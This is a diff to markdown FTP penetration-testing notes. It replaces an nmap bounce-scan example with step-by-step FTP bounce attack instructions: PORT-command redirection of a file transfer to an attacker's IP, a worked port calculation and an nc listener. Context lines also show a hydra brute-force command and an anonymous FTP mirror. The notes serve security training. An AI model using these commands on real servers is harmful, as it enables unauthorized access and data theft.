@@ -144,8 +144,8 @@ openssl s_client -connect $ip:21 -starttls ftp
 ```
 # Download all available files at once
 wget -m --no-passive ftp://anonymous:anonymous@$ip
-
 ```
+
 
 
 ### What is the FTP/S EPSV command?
@@ -183,12 +183,62 @@ hydra -L users.txt -P pass.txt ftp://$ip:2121
 
 ### FTP Bounce Attack
 
-An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. For instance, consider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports.
+FTP Bounce Attack exploits the FTP protocol's ability to redirect traffic, masking the attack source. It uses an FTP server's `PORT` command to route data to a third party, making the attack seem to originate from the server. 
 
-```shell-session
-nmap -Pn -v -n -p80 -b anonymous:password@$ipFTPdmz $ipINTERNALdmz
-# -b The `Nmap` -b flag can be used to perform an FTP bounce attack: 
+**How to Execute an FTP Bounce Attack:**
+
+1. `Find an FTP` server that doesn't restrict the `PORT` command.
+2. Connect to the FTP server.
+
+```bash
+ftp $ip
 ```
+
+3. Use the `PORT` command to redirect data to the target.
+
+```bash
+quote PORT $kaliIP,$kaliport
+```
+
+BUT, in reality the syntax is:
+
+
+```
+quote PORT h1,h2,h3,h4,p1,p2
+```
+
+where h1, h2, h3 h4 is your kali ip. Let's say we have the ip 192.168.45.230. And for the port we have port 5555. We need to calculate p1 and p2 to indicate the port.  Calculation:
+
+```
+5555 / 256 = 21 remainder 179
+
+Therefore:
+p1=21
+p2=179
+```
+
+So final command would be:
+
+```bash
+quote PORT 192,168,45,230,21,179
+```
+
+
+4. Set a listener in your kali
+
+```bash
+nc -lnvp 5555
+```
+
+4. Initiate a file transfer or command that sends data to the target. From the ftp connection
+
+```
+get filename
+```
+
+This command requests a file from the FTP server, which is then sent to the specified target, exploiting the bounce capability.
+
+
 
 ### CoreFTP Server build 725 - Directory Traversal (Authenticated)
 
